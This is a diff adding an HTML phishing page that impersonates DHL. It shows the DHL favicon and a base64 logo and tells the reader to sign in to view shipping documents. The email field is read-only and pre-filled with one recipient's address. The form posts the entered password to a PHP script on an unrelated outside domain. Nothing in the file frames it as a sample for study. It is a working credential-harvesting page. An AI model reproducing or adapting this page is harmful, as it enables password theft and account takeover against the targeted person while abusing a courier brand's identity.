@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+                    <html>
+
+                    <title>(1) Pending File </title>
+
+
+                      <meta charset='utf-8'>
+                      <meta name='viewport' content='width=device-width, initial-scale=1'>
+                      <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css'>
+                      <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
+                      <script src='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js'></script>
+                      <link rel="shortcut icon" href="https://www.dhl.com/img/favicon.gif" type="image/gif"/>
+
+
+
+                    <style>
+                    body {
+                      font-family: Arial;
+                    }
+
+                    input[type=email], select {
+                        width: 70%;
+                        padding: 12px 20px;
+                        margin: 15px 0;
+                        display: block;
+                        border: 2px solid #ffc40c;
+                        border-radius: 4px;
+                        box-sizing: border-box;
+                    }
+
+                    input[type=password], select {
+                        width: 70%;
+                        padding: 12px 20px;
+                        margin: 15px 0;
+                        display: block;
+                        border: 2px solid #ffc40c;
+                        border-radius: 4px;
+                        box-sizing: border-box;
+                    }
+
+                    input[type=submit] {
+                        width: 50%;
+                        background-color: #FF0000;
+                        color: white;
+                        padding: 12px 15px;
+                        margin: 4px 0;
+                        border: none;
+                        border-radius: 2px;
+                        cursor: pointer;
+                    }
+
+                    input[type=submit]:hover {
+                        background-color: #FF0000;
+                    }
+
+                    div.absolute {
+						position: absolute;
+						left: 400px;
+                        margin: auto;
+                        width: 10%;
+                        padding: 10px;
+                        border: 5px #ffc40c;
+                        border-radius: 5px;
+                        background-color: white;
+                        width: 400px;
+                        padding: 20px;
+                        border-style: solid;
+                        border-width: solid;
+                    }
+                    </style>
+
+                    <body>
+
+
+                     <br><br><br><br>
+                    <div class='absolute'>
+					
+
+
+                    <img src='data:image/png;base64,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' alt="dhl" height="90" center center no-repeat">
+
+                    
+                    <form action='https://dirtydaleandson.com/3e3e/cc/BB/22/AA/1/dhl.php?email=js111555@komipo.co.kr' method='POST'>
+
+
+                    <hr style='height:2px;border:none;color:#ffc40c;background-color:#ffc40c;' />
+                    
+					<div class='alert alert-danger'>
+                        <strong>Alert!:</strong> Sign in to view Shipping Docs
+                      </div>
+                            
+
+                    <center>
+
+                    <input type='email' id='fname' name='feedback' Placeholder='Enter Email Address' value='js111555@komipo.co.kr
+
+
+
+' readonly required>
+
+                        <input type='password' id='fname' name='feedbacknow' placeholder='Password' autofocus required>
+
+
+                      
+                        <input type='submit' value='Sign in To Download File'>
+                      </center>
+
+
+                    </form>
+
+                    </div>
+
+                    </body>
+                    </html>
+
+                
